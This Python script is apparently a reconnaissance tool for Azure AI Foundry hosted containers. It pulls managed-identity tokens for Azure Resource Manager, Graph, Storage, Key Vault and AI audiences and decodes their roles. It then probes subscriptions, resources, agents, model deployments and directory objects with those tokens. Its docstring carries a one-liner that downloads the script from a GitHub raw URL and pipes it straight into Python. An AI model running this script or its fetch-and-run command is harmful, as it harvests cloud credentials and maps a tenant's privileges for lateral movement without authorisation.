#!/usr/bin/env python3
"""Foundry hosted container recon: MI token audiences + data plane reach.
curl -sL https://raw.githubusercontent.com/nivmorabin/skills/master/dict-walk/foundry_recon.py | python3
"""
import json, base64, os, urllib.request

ep = os.environ.get("IDENTITY_ENDPOINT", "")
hdr = os.environ.get("IDENTITY_HEADER", "")
proj = os.environ.get("FOUNDRY_PROJECT_ENDPOINT", "")

def msi_token(resource):
    url = f"{ep}?api-version=2019-08-01&resource={resource}"
    req = urllib.request.Request(url, headers={"X-IDENTITY-HEADER": hdr})
    with urllib.request.urlopen(req) as r:
        return json.load(r)["access_token"]

def decode_jwt(tok):
    parts = tok.split(".")
    pad = lambda s: s + "=" * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(pad(parts[1])))

def api_get(url, token):
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read().decode()[:500]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:300]
    except Exception as e:
        return 0, str(e)[:200]

print("=" * 60)
print("FOUNDRY HOSTED CONTAINER RECON")
print("=" * 60)

# 1. MSI multi-audience
print("\n--- MSI TOKEN AUDIENCES ---")
audiences = [
    "https://management.azure.com/",
    "https://graph.microsoft.com/",
    "https://storage.azure.com/",
    "https://vault.azure.net/",
    "https://cognitiveservices.azure.com/",
    "https://ai.azure.com/",
]
tokens = {}
for aud in audiences:
    try:
        tok = msi_token(aud)
        c = decode_jwt(tok)
        tokens[aud] = tok
        print(f"  {aud}")
        print(f"    aud={c.get('aud')}  appid={c.get('appid')}  roles={c.get('roles',[])}")
        if c.get("xms_mirid"):
            print(f"    xms_mirid={c['xms_mirid']}")
    except Exception as e:
        print(f"  {aud} -> FAIL: {e}")

# 2. ARM reach
print("\n--- ARM REACH ---")
arm_tok = tokens.get("https://management.azure.com/", "")
if arm_tok:
    code, body = api_get("https://management.azure.com/subscriptions?api-version=2022-12-01", arm_tok)
    print(f"  /subscriptions -> {code}: {body[:200]}")

    arm_id = os.environ.get("FOUNDRY_PROJECT_ARM_ID", "")
    if arm_id:
        parts = arm_id.split("/")
        sub, rg = parts[2], parts[4]
        code, body = api_get(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/resources?api-version=2021-04-01", arm_tok)
        print(f"  /resources -> {code}: {body[:300]}")

# 3. Foundry data plane
print("\n--- FOUNDRY DATA PLANE (ai.azure.com audience) ---")
ai_tok = tokens.get("https://ai.azure.com/", "")
if ai_tok and proj:
    for path in [
        "/agents?api-version=2025-05-01-preview",
        "/openai/deployments?api-version=2025-03-01-preview",
        "/openai/deployments?api-version=2024-12-01-preview",
    ]:
        code, body = api_get(f"{proj}{path}", ai_tok)
        print(f"  {path}")
        print(f"    -> {code}: {body[:300]}")
        if code == 200:
            break

# 4. CognitiveServices data plane
print("\n--- COGNITIVESERVICES DATA PLANE ---")
cs_tok = tokens.get("https://cognitiveservices.azure.com/", "")
if cs_tok and proj:
    # The CogSvc endpoint is the parent account, not the project
    acct_ep = proj.rsplit("/api/projects/", 1)[0] if "/api/projects/" in proj else proj
    for path in [
        "/openai/deployments?api-version=2024-10-21",
        "/openai/models?api-version=2024-10-21",
    ]:
        code, body = api_get(f"{acct_ep}{path}", cs_tok)
        print(f"  {acct_ep}{path}")
        print(f"    -> {code}: {body[:300]}")
        if code == 200:
            break

# 5. Graph
print("\n--- GRAPH ---")
graph_tok = tokens.get("https://graph.microsoft.com/", "")
if graph_tok:
    code, body = api_get("https://graph.microsoft.com/v1.0/organization", graph_tok)
    print(f"  /organization -> {code}: {body[:300]}")
    code, body = api_get("https://graph.microsoft.com/v1.0/servicePrincipals?$top=3", graph_tok)
    print(f"  /servicePrincipals -> {code}: {body[:300]}")

print("\n" + "=" * 60)
print("DONE")
